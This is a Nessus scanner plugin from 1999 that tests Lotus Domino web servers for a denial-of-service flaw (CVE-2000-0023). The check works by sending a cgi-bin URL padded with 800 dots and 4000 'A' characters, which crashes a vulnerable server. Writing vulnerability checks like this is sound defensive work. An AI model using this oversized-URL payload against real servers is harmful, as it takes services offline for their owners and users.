#
# This script was written by Alain Thivillon <Alain.Thivillon@hsc.fr>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10059);
 script_bugtraq_id(881);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0023");
 name["english"] = "Domino HTTP Denial";
 name["francais"] = "Déni de service contre le serveur HTTP Domino";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to perform a denial of service against the remote
HTTP server by sending it a long /cgi-bin relative URL. 

This problem allows an attacker to prevent your Lotus Domino web 
server from handling requests.

Solution : contact your vendor for a patch, or change your server. 
Consider changing cgi-bin mapping by something impossible to guess 
in server document of primary Notes NAB.

Risk factor : High";

 desc["francais"] = "Il s'est avéré possible
de créer un déni de service sur le serveur
HTTP Domino distant en lui envoyant une URL trop
longue relative au répertoire /cgi-bin

Un pirate peut utiliser ce problème
pour empecher votre serveur de traiter
les requetes HTTP.

Solution : contactez votre vendeur pour un
patch, ou changez de serveur. Vous pouvez
également changer l'URL des cgi-bin par quelque chose
impossible à deviner en modifiant le document serveur
du carnet d'adresses Notes.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the Domino HTTP server";
 summary["francais"] = "Fait planter le serveur HTTP Domino";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison et Alain Thivillon",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison et Alain Thivillon");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "Lotus Domino" >!< sig ) exit(0);

banner = get_http_banner(port:port);
if ("Lotus Domino" >!< banner ) exit(0);

foreach dir (cgi_dirs())
{
 c = string(dir, "/", crap(length:800, data:"."), crap(length:4000,data:"A"));
 soc = http_open_socket(port);
 if(soc)
 {
  req = http_get(item:c, port:port);
  send(socket:soc, data:req);
  s = http_recv(socket:soc);
  http_close_socket(soc);
  if(!s) {
  	security_hole(port);
	exit(0);
	}
 }
}
	
